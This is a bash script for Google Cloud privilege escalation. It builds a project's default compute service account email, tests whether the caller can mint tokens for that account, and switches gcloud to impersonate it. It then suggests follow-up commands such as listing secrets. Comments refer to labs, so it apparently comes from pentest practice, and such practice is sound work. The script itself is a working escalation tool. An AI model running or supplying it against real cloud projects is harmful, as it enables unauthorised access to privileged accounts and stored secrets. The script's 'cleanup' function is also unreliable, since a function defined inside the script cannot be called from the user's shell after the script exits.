#!/bin/bash
# gcp-impersonation-chain.sh
# Chains: Construct default compute SA email → Impersonate it via gcloud
# Output: Leaves your gcloud session impersonated as the target SA (high-priv default)
# Usage: ./gcp-impersonation-chain.sh
#        Enter project number when prompted (e.g., 208771875438)
# Cleanup: Run the cleanup function or unset manually

set -euo pipefail

# Manual input for project number
read -p "Enter project number (e.g., 208771875438): " PROJECT_NUMBER
if [[ -z "$PROJECT_NUMBER" ]]; then
    echo "Error: Project number required."
    exit 1
fi

# Construct default high-priv SA email (compute default — often has editor/owner in labs)
TARGET_SA="${PROJECT_NUMBER}-compute@developer.gserviceaccount.com"

echo "Chaining impersonation to $TARGET_SA"
echo ""

# Test if impersonation is possible (abuses getAccessToken/actAs)
gcloud auth print-access-token --impersonate-service-account="$TARGET_SA" || {
    echo "Failed to generate token for $TARGET_SA."
    echo "Possible reasons: No actAs/getAccessToken/implicitDelegation on this SA, or SA does not exist."
    exit 1
}

# Set impersonation (chains to high-priv SA — now all gcloud runs as it)
gcloud config set auth/impersonate_service_account "$TARGET_SA"

# Verify
echo "[+] Success — now impersonated as $TARGET_SA"
gcloud auth list
echo ""

# Next steps for escalation (manual after script)
echo "You are now in impersonated state. Run commands like:"
echo "  gcloud projects list"
echo "  gcloud secrets list"
echo "  gcloud compute instances list"

# Cleanup function (run this when done)
cleanup () {
    gcloud config unset auth/impersonate_service_account
    echo "Cleanup complete — back to original auth."
}

# Leave the shell in impersonated state (call cleanup when ready)
echo "Script complete. Call 'cleanup' to revert."
